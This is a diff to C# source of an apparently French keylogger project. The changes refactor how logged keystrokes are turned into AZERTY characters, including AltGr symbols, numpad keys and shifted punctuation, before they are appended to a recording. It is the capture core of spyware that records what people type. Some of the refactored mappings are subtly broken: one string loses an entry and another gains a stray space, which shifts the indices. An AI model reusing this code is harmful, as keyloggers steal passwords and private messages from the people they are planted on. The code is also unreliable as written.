@@ -88,6 +88,7 @@ namespace ProjetKeyLogger
                         //le temps d'innactivité est reinitialisé
                         date_dernier_activite = DateTime.Now;
 
+                        string valeurs;
                         switch (codeASCII)
                         {
                             //Si touche Entrée
@@ -124,7 +125,7 @@ namespace ProjetKeyLogger
 
                             //touche espace
                             case 9:
-                                enregistrement.ajouterContenu(Char.Parse(" "));
+                                enregistrement.ajouterContenu(" ");
                                 break;
 
                             //touche suppr 
@@ -149,20 +150,22 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == false & altgr == false & shift == false)
                                     {
-                                        char[] valeurs = { 'à', '&', 'é', '\"', '\'', '(', '-', 'è', '_', 'ç' };
-                                        enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
+                                        valeurs = "à&é\"'(-è_ç";
+                                        enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
                                     }
                                     else
                                     {
                                         if (altgr == true)
                                         {
-                                            char[] valeurs = { '@', ' ', '~', '#', '{', '[', '|', '`', '\\', '^', '"' };
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
+                                            valeurs = "@ ~#{[|`\\^";
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
                                             altgr = false;
                                         }
                                         else
                                         {
-                                            enregistrement.ajouterContenu((char)codeASCII);
+                                            valeurs = "0123456789";
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
+
                                         }
                                     }
                                 }
@@ -185,8 +188,9 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
-                                    enregistrement.ajouterContenu(valeurs[codeASCII - 96]);
+                                    valeurs = "0123456789";
+                                    enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 96, 1));
+
                                 }
                                 break;
 
@@ -202,8 +206,8 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = { '*', '+',' ', '-', '.', '/' };
-                                    enregistrement.ajouterContenu(valeurs[codeASCII - 106]);
+                                    valeurs = "*+ -./";
+                                    enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 106, 1));
                                 }
                                 break;
 
@@ -244,22 +248,22 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = {'$','=',',',' ',';',':','ù','£','+','?','.','/','%','¤','}' };
+                                    valeurs = "$=, ;:ù£+? ./%¤}"; 
                                     if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        enregistrement.ajouterContenu(valeurs[codeASCII - 179]);
+                                        enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 179, 1));
                                         shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & (codeASCII == 186 | codeASCII == 187))
                                         {
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 172]);
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 172, 1));
                                             altgr = false;
                                         }
                                         else
                                         {
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 186]);
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 186, 1));
                                         }
                                     }
                                 }
@@ -276,21 +280,21 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = { ')', '*', '^', '²', '!', '°', 'µ', '¨', '²', '§' };
+                                    valeurs = ")*^²!°µ¨²§";
                                     if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        enregistrement.ajouterContenu(valeurs[codeASCII - 214]);
+                                        enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 214, 1));
                                         shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & codeASCII == 219)
                                         {
-                                            enregistrement.ajouterContenu(char.Parse("]"));
+                                            enregistrement.ajouterContenu(("]"));
                                         }
                                         else
                                         {
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 219]);
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 219, 1));
                                         }
                                     }
                                 }
@@ -306,11 +310,11 @@ namespace ProjetKeyLogger
                                 {
                                     if (shift == false)
                                     {
-                                        enregistrement.ajouterContenu(char.Parse("<"));
+                                        enregistrement.ajouterContenu("<");
                                     }
                                     else
                                     {
-                                        enregistrement.ajouterContenu(char.Parse(">"));
+                                        enregistrement.ajouterContenu(">");
                                         shift = false;
                                     }
                                 }
@@ -333,7 +337,8 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == true | shift == true)
                                     {
-                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII));
+                                        
+                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
                                         shift = false;
                                     }
                                     else
